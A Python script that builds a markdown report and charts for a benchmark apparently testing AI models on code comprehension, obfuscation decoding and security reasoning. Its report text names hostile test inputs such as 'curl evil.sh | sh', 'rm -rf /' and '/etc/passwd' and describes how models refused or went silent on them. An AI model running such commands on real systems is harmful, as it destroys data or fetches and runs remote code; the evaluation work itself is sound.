"""Regenerate the Phase 0-1 evaluation report and its charts.

Single source of truth: reports_data.json (rows + per-sample answers extracted
from the inspect-ai eval logs). Models are labelled by provider so the two
GLM-5.1 deployments (FPT AI vs OpenCode Go) are distinct everywhere.

Outputs (all under reports/):
  fig_easy_vs_hard.png, fig_heatmap.png, fig_thinking_cost.png,
  fig_efficiency.png, agg.json, main.md

Run: uv run python scripts/build_report.py
"""

from __future__ import annotations

import json
from pathlib import Path

import matplotlib

matplotlib.use("Agg")
import matplotlib.pyplot as plt  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
DATA = ROOT / "reports_data.json"
OUT = ROOT / "reports"

# Canonical full-suite runs (one row per model/task). Smoke/retry dirs excluded.
CANONICAL_DIRS = {"survey", "zen-sota"}

# Deployments excluded from the report entirely (no live backend on the gateway).
EXCLUDE_BASES = {"claude-opus-4-6"}

TASKS = [
    "code_comprehension", "obfuscation", "security_reasoning",
    "code_comprehension_hard", "obfuscation_hard", "security_reasoning_hard",
]
SHORT = {
    "code_comprehension": "cc", "obfuscation": "obf", "security_reasoning": "sec",
    "code_comprehension_hard": "cc-H", "obfuscation_hard": "obf-H",
    "security_reasoning_hard": "sec-H",
}
EASY = TASKS[:3]
HARD = TASKS[3:]

# Provider routing is fixed per model identity (the only name collision,
# GLM-5.1 vs glm-5.1, is split by the fptcloud/ prefix below).
ZEN_BASES = {
    "gpt-5.3-codex", "gpt-5.4", "gpt-5.5",
    "claude-opus-4-6", "claude-opus-4-7", "claude-opus-4-8",
}


def base_name(model_id: str) -> str:
    base = model_id.split("/")[-1]
    return "GLM-5.1" if base.lower() == "glm-5.1" else base


def provider(model_id: str) -> str:
    if "fptcloud" in model_id:
        return "FPT AI"
    if base_name(model_id) in ZEN_BASES:
        return "Opencode Zen"
    return "Opencode Go"


def disp(model_id: str) -> str:
    return f"{base_name(model_id)} ({provider(model_id)})"


# --------------------------------------------------------------------------- #
# Aggregate
# --------------------------------------------------------------------------- #
def build_aggregate(rows: list[dict]) -> dict:
    canon = [r for r in rows if r["dir"] in CANONICAL_DIRS
             and base_name(r["model"]) not in EXCLUDE_BASES]
    models = sorted({disp(r["model"]) for r in canon})

    agg: dict[str, dict] = {m: {t: None for t in TASKS} for m in models}
    out_tokens: dict[str, list[int]] = {m: [] for m in models}
    rsn_tokens: dict[str, list[int]] = {m: [] for m in models}
    has_success: dict[str, bool] = {m: False for m in models}

    for r in canon:
        m = disp(r["model"])
        if r["acc"] is not None:
            agg[m][r["task"]] = r["acc"]
            has_success[m] = True
            out_tokens[m].append(r["outtok"])
            rsn_tokens[m].append(r["rtok"])

    extra: dict[str, dict] = {}
    for m in models:
        easy = [agg[m][t] for t in EASY if agg[m][t] is not None]
        hard = [agg[m][t] for t in HARD if agg[m][t] is not None]
        ot = out_tokens[m]
        rt = rsn_tokens[m]
        extra[m] = {
            "easy": (sum(easy) / len(easy)) if easy else None,
            "hard": (sum(hard) / len(hard)) if hard else None,
            "mean_out": round(sum(ot) / len(ot)) if ot else 0,
            "mean_rsn": round(sum(rt) / len(rt)) if rt else 0,
            "provider": m[m.rfind("(") + 1: -1],
            "status": "ok" if has_success[m] else "FAILED",
        }
    return {"agg": agg, "extra": extra, "models": models}


def build_fails(samples: list[dict]) -> list[list]:
    seen: dict[tuple, list] = {}
    for s in samples:
        # Drop correct answers and crashed calls (score "None" = infra error,
        # not a behavioural failure); drop excluded deployments.
        if s["score"] in ("C", "None"):
            continue
        if base_name(s["model"]) in EXCLUDE_BASES:
            continue
        key = (disp(s["model"]), s["task"], s["id"])
        # Prefer a decisive (non-None) score / non-empty answer if duplicated.
        cand = [disp(s["model"]), s["task"], s["id"], s["target"], s["score"],
                (s["answer"] or "").strip()]
        if key not in seen or (cand[5] and not seen[key][5]):
            seen[key] = cand
    return list(seen.values())


# --------------------------------------------------------------------------- #
# Charts
# --------------------------------------------------------------------------- #
def _ranked(extra: dict) -> list[str]:
    return sorted(
        extra,
        key=lambda m: (extra[m]["hard"] or -1, extra[m]["easy"] or -1),
        reverse=True,
    )


def chart_easy_vs_hard(extra: dict) -> None:
    ok = [m for m in _ranked(extra) if extra[m]["status"] == "ok"]
    easy = [extra[m]["easy"] for m in ok]
    hard = [extra[m]["hard"] for m in ok]
    x = range(len(ok))
    w = 0.4
    fig, ax = plt.subplots(figsize=(11, 6))
    ax.bar([i - w / 2 for i in x], easy, w, label="easy", color="#4c9be8")
    ax.bar([i + w / 2 for i in x], hard, w, label="hard", color="#e8694c")
    ax.set_xticks(list(x))
    ax.set_xticklabels(ok, rotation=45, ha="right", fontsize=8)
    ax.set_ylabel("accuracy")
    ax.set_ylim(0, 1.05)
    ax.set_title("Easy vs hard accuracy by model (sorted by hard accuracy)")
    ax.legend()
    fig.tight_layout()
    fig.savefig(OUT / "fig_easy_vs_hard.png", dpi=130)
    plt.close(fig)


def chart_heatmap(agg: dict, extra: dict) -> None:
    ok = [m for m in _ranked(extra) if extra[m]["status"] == "ok"]
    grid = [[agg[m][t] if agg[m][t] is not None else float("nan") for t in TASKS]
            for m in ok]
    fig, ax = plt.subplots(figsize=(9, 7))
    im = ax.imshow(grid, cmap="RdYlGn", vmin=0, vmax=1, aspect="auto")
    ax.set_xticks(range(len(TASKS)))
    ax.set_xticklabels([SHORT[t] for t in TASKS])
    ax.set_yticks(range(len(ok)))
    ax.set_yticklabels(ok, fontsize=8)
    for i, m in enumerate(ok):
        for j, t in enumerate(TASKS):
            v = agg[m][t]
            ax.text(j, i, "—" if v is None else f"{v:.2f}",
                    ha="center", va="center", fontsize=7)
    ax.set_title("Per-task accuracy heatmap")
    fig.colorbar(im, ax=ax, shrink=0.7, label="accuracy")
    fig.tight_layout()
    fig.savefig(OUT / "fig_heatmap.png", dpi=130)
    plt.close(fig)


def chart_thinking_cost(extra: dict) -> None:
    ok = sorted([m for m in extra if extra[m]["status"] == "ok"],
                key=lambda m: extra[m]["mean_out"], reverse=True)
    vals = [extra[m]["mean_out"] for m in ok]
    fig, ax = plt.subplots(figsize=(11, 6))
    ax.barh(ok, vals, color="#7b5ea7")
    ax.invert_yaxis()
    ax.set_xlabel("mean generated tokens per task")
    ax.set_title("'Thinking' cost — mean output tokens per task")
    for i, v in enumerate(vals):
        ax.text(v, i, f" {v:,}", va="center", fontsize=8)
    ax.tick_params(axis="y", labelsize=8)
    fig.tight_layout()
    fig.savefig(OUT / "fig_thinking_cost.png", dpi=130)
    plt.close(fig)


def chart_efficiency(extra: dict) -> None:
    ok = [m for m in extra if extra[m]["status"] == "ok" and extra[m]["hard"]]
    fig, ax = plt.subplots(figsize=(10, 7))
    for m in ok:
        x = extra[m]["mean_out"]
        y = extra[m]["hard"]
        color = {"FPT AI": "#e8694c", "Opencode Go": "#4c9be8",
                 "Opencode Zen": "#3aa86b"}[extra[m]["provider"]]
        ax.scatter(x, y, s=70, color=color, edgecolor="black", linewidth=0.5, zorder=3)
        ax.annotate(m, (x, y), fontsize=7, xytext=(5, 4),
                    textcoords="offset points")
    handles = [plt.Line2D([0], [0], marker="o", linestyle="", color=c, label=p)
               for p, c in (("FPT AI", "#e8694c"), ("Opencode Go", "#4c9be8"),
                            ("Opencode Zen", "#3aa86b"))]
    ax.legend(handles=handles, title="provider")
    ax.set_xlabel("mean generated tokens per task (log)")
    ax.set_xscale("log")
    ax.set_ylabel("hard-set accuracy")
    ax.set_title("Efficiency — hard accuracy vs token spend")
    ax.grid(True, alpha=0.3)
    fig.tight_layout()
    fig.savefig(OUT / "fig_efficiency.png", dpi=130)
    plt.close(fig)


# --------------------------------------------------------------------------- #
# Report
# --------------------------------------------------------------------------- #
def cell(v) -> str:
    return "—" if v is None else f"{v:.2f}"


def fail_table(fails: list[list], pred, limit: int = 99, trunc: int = 80,
               only_empty: bool = False) -> str:
    out = []
    for m, t, i, tgt, score, ans in fails:
        if not pred(m, t, i):
            continue
        if only_empty and ans:
            continue
        a = ans[:trunc] if ans else "*(empty)*"
        a = a.replace("|", "\\|")
        tg = str(tgt).replace("|", "\\|")
        out.append(f"| `{m}` | {t}/{i} | `{tg}` | `{score}` | {a} |")
    return "\n".join(out[:limit]) or "| — | — | — | — | *(none)* |"


def write_report(agg, extra, fails, models) -> None:
    ok = [m for m in _ranked(extra) if extra[m]["status"] == "ok"]
    failed = [m for m in models if extra[m]["status"] == "FAILED"]
    L: list[str] = []
    A = L.append

    A("# AI-Augmented Supply-Chain-Attack Analysis — Model Evaluation Report")
    A("")
    A("**Phase 0–1 capability survey · 2026-05-30**  ")
    A(f"**{len(ok)} model deployments evaluated** across "
      "**6 capability tasks** (3 axes × easy/hard), run through the "
      "model-independent `sca-eval` harness (inspect-ai + deterministic scorers).")
    A("")
    A("The same model can be served by different gateways, so deployments are "
      "labelled by **provider** — e.g. `GLM-5.1 (FPT AI)` and `GLM-5.1 (Opencode Go)` "
      "are scored as distinct entries throughout this report.")
    A("")
    A("---\n")

    # ---- Section 1 -------------------------------------------------------- #
    A("## 1. How the models were tested, and how they responded\n")
    A("### 1.1 Providers and routing\n")
    A("| Provider | Endpoint | Wire protocol | Deployments |")
    A("|---|---|---|---|")
    prov_models = {}
    for m in models:
        prov_models.setdefault(extra[m]["provider"], []).append(base_name_of(m))
    A("| **FPT AI** | `mkp-api.fptcloud.com` | OpenAI-compatible | "
      + ", ".join(prov_models.get("FPT AI", [])) + " |")
    A("| **Opencode Go** | `opencode.ai/zen/go/v1` | OpenAI-compatible "
      "(+ Anthropic `/messages` for qwen3.7-max) | "
      + ", ".join(prov_models.get("Opencode Go", [])) + " |")
    A("| **Opencode Zen** | `opencode.ai/zen/v1` | OpenAI-compatible (GPT) / "
      "Anthropic `/messages` (Opus) | " + ", ".join(prov_models.get("Opencode Zen", [])) + " |")
    A("")
    A("Every deployment receives identical prompts, scorers and decoding "
      "parameters (`max_tokens=8192`, default temperature, `retry_attempts=3`), "
      "so scores are comparable *within a task family*.\n")

    A("### 1.2 Test construction\n")
    A("Three language-agnostic axes, each with an *easy* seed set and a "
      "deliberately *hard* set (no npm or ecosystem-specific data — the ranking "
      "is intentionally ecosystem-independent):\n")
    A("| Axis | What the probe asks | Scorer | Ground truth |")
    A("|------|--------------------|--------|--------------|")
    A("| **code comprehension** | predict output / complexity / behaviour of "
      "unfamiliar code | `includes()` substring | exact short answer |")
    A("| **obfuscation** | decode base64 / hex / ROT13 / XOR / octal, multi-layer "
      "& PowerShell `-enc` | `match(location=any, ignore_case)` | exact decoded string |")
    A("| **security reasoning** | classify a snippet, ending in a `VERDICT:` line "
      "| strict line-anchored verdict parser → `CORRECT` / `INCORRECT` / `NOANSWER` "
      "| `vulnerable` / `safe` (incl. *safe traps*) |")
    A("")
    A("The hard security set deliberately mixes genuine vulnerabilities with "
      "**safe traps** — defended code that *looks* dangerous — to measure "
      "false-positive bias, not just recall.\n")

    A("### 1.3 How they respond and 'think'\n")
    A("Token telemetry separates the field into three response styles:\n")
    A("| Style | Deployments | Mean output tok/task | Reasoning tokens exposed? |")
    A("|---|---|---|---|")
    A("| **Verbose reasoners** | open Qwen / DeepSeek / GLM | 3.7k–17k | yes (counted) |")
    A("| **Terse responders** | Claude Opus (Zen) | 16–300 | hidden (reported 0) |")
    A("| **Middleweight** | GPT-5.x (Zen) | ~1k | hidden (reported 0) |")
    A("")
    A("Per-deployment generation cost (mean over successful tasks):\n")
    A("| deployment | mean output tok | mean reasoning tok |")
    A("|---|---|---|")
    for m in sorted(ok, key=lambda m: extra[m]["mean_out"], reverse=True):
        A(f"| `{m}` | {extra[m]['mean_out']:,} | {extra[m]['mean_rsn']:,} |")
    A("")
    A("Open models on Go/FPT report real chain-of-thought token counts "
      "(`deepseek-v4-flash` and the OpenCode `glm-5.1` exceed 14k on a single "
      "hard-obfuscation item); the Zen GPT and Opus gateways hide reasoning and "
      "report `0`, so their true deliberation cost is understated here.\n")
    A("---\n")

    # ---- Section 2 -------------------------------------------------------- #
    A("## 2. Performance\n")
    A("### 2.1 Easy vs hard accuracy\n")
    A("![easy vs hard](fig_easy_vs_hard.png)\n")
    A("Hard sets discriminate as designed: easy obfuscation is saturated (~1.0 "
      "everywhere) while hard obfuscation spreads 0.56–1.0.\n")
    A("### 2.2 Per-task heatmap\n")
    A("![heatmap](fig_heatmap.png)\n")
    A("Columns: `cc`/`obf`/`sec` (easy) and `cc-H`/`obf-H`/`sec-H` (hard). "
      "The hard obfuscation and hard security columns carry almost all the "
      "discriminating signal.\n")
    A("### 2.3 'Thinking' cost — mean generated tokens per task\n")
    A("![thinking cost](fig_thinking_cost.png)\n")
    A("### 2.4 Efficiency — hard accuracy vs token spend\n")
    A("![efficiency](fig_efficiency.png)\n")
    A("Coloured by provider. `claude-opus-*` and `gpt-5.x` (Zen) reach near-top "
      "hard accuracy at roughly **10× fewer reported tokens** than the open "
      "reasoners — though hidden reasoning tokens flatter that comparison.\n")
    A("### 2.5 Full matrix (ranked by hard accuracy)\n")
    A("| deployment | provider | " + " | ".join(SHORT[t] for t in TASKS)
      + " | easy | hard |")
    A("|---|---|" + "|".join("---" for _ in TASKS) + "|---|---|")
    for m in ok:
        A(f"| `{m}` | {extra[m]['provider']} | "
          + " | ".join(cell(agg[m][t]) for t in TASKS)
          + f" | **{extra[m]['easy']:.2f}** | **{extra[m]['hard']:.2f}** |")
    for m in failed:
        A(f"| `{m}` | {extra[m]['provider']} | "
          + " | ".join("ERR" for _ in TASKS) + " | — | — |")
    A("")
    A("**Provider note:** the two GLM-5.1 deployments diverge on *easy* code "
      "comprehension — `GLM-5.1 (FPT AI)` scores 1.00 while `GLM-5.1 (Opencode Go)` "
      "scores 0.75 — despite identical hard-set accuracy (0.93). Same weights, "
      "different serving stack and sampling, measurably different behaviour.\n")
    A("---\n")

    # ---- Section 3 -------------------------------------------------------- #
    A("## 3. Rejections and failures\n")
    A("### 3.1 Did models refuse the (malware-flavoured) inputs?\n")
    A("Largely **no**. Inputs included reverse shells (`curl evil.sh | sh`), "
      "`rm -rf /`, `/etc/passwd`, `eval(atob(x))`, `netcat` — yet almost every "
      "deployment decoded/analysed them as legitimate security work. Two "
      "refusal-shaped behaviours appeared:\n")
    A("**(a) One explicit refusal.**\n")
    A("| deployment | sample | target | score | answer |")
    A("|---|---|---|---|---|")
    A(fail_table(fails, lambda m, t, i: "sorry" in next(
        (a for mm, tt, ii, tg, sc, a in fails if (mm, tt, ii) == (m, t, i)),
        "").lower(), trunc=120))
    A("\nThe single clearest content refusal in the entire run.\n")
    A("**(b) Silent empty completions on the most malicious-looking payloads.** "
      "Several deployments returned an *empty* answer specifically on `obh-001` "
      "(`eval(atob(x))`), `obh-005` (`curl evil.sh | sh`) and `obh-007` "
      "(`/bin/sh`) — a soft decline distinct from a wrong answer:\n")
    A("| deployment | sample | target | score | answer |")
    A("|---|---|---|---|---|")
    A(fail_table(fails, lambda m, t, i: t == "obfuscation_hard"
                 and i in ("obh-001", "obh-005", "obh-007"), limit=14,
                 only_empty=True))
    A("\nThese are the payloads most associated with attacks, so safety tuning "
      "suppresses output — the same deployments decode tamer base64/hex payloads "
      "in the easy set without hesitation.\n")

    A("### 3.2 Systematic capability failures — false-positive bias on *safe* code\n")
    A("The hard security traps `srh-004` (a correct `realpath`+`commonpath` "
      "containment check) and `srh-008` (`subprocess.run([...], shell=False)`) "
      "are genuinely safe, yet were repeatedly judged `vulnerable` or returned "
      "`NOANSWER`. A strong 'flag it' bias plus contestable ground truth:\n")
    A("| deployment | sample | target | score | answer (truncated) |")
    A("|---|---|---|---|---|")
    A(fail_table(fails, lambda m, t, i: t == "security_reasoning_hard"
                 and i in ("srh-004", "srh-008"), limit=16))
    A("\nFix: a pinned, calibrated model-grader (design §7) rather than a binary "
      "string verdict.\n")

    A("### 3.3 Scoring artefacts (not capability failures)\n")
    A("The lenient deterministic scorer over-penalises formatting on the *easy* "
      "code set:\n")
    A("| deployment | sample | target | score | answer |")
    A("|---|---|---|---|---|")
    A(fail_table(fails, lambda m, t, i: t == "code_comprehension"
                 and i in ("cc-002", "cc-003", "cc-004"), limit=12))
    A("\n- `cc-002`: models answer `O(n²)` (Unicode superscript); target is "
      "`O(n^2)` → false miss.\n"
      "- `cc-004`: target `yes` is **contestable** — models answer `No`, "
      "reasoning that char-reversal breaks on multi-byte graphemes (defensible).\n\n"
      "These inflate apparent 'easy' failures and motivate replacing "
      "`includes()` / `match()` with model-graded scoring.\n")

    A("### 3.4 Reliability\n")
    A("- **Transient `Internal server error`** hit the Opus deployments and some "
      "open models (~1-in-3 probes) but was absorbed by automatic retries "
      "(`retry_attempts=3`) → valid scores.")
    A("- **Failure honesty.** When a gateway returned a hard error "
      "(`ModelError: No provider available`, HTTP 401 — a backend the gateway "
      "advertises but does not actually serve), the harness rendered `ERR` and "
      "logged it to `FAILURES.md` rather than fabricating a `0.00`. Deployments "
      "with no live backend are omitted from this report.\n")
    A("---\n")
    A("*Generated by `scripts/build_report.py` from `reports_data.json` "
      "(inspect-ai eval logs in `logs/survey` and `logs/zen-sota`). "
      "Charts: `reports/fig_*.png`. Raw aggregates: `reports/agg.json`.*")

    (OUT / "main.md").write_text("\n".join(L))


def base_name_of(display: str) -> str:
    return display[: display.rfind(" (")]


def main() -> None:
    d = json.loads(DATA.read_text())
    rows, samples = d["rows"], d["samples"]
    a = build_aggregate(rows)
    fails = build_fails(samples)

    OUT.mkdir(exist_ok=True)
    chart_easy_vs_hard(a["extra"])
    chart_heatmap(a["agg"], a["extra"])
    chart_thinking_cost(a["extra"])
    chart_efficiency(a["extra"])

    (OUT / "agg.json").write_text(json.dumps(
        {"agg": a["agg"], "extra": a["extra"], "fails": fails}, indent=1))
    write_report(a["agg"], a["extra"], fails, a["models"])
    print(f"wrote {OUT/'main.md'} and 4 charts; "
          f"{len(a['models'])} deployments, {len(fails)} non-correct samples")


if __name__ == "__main__":
    main()
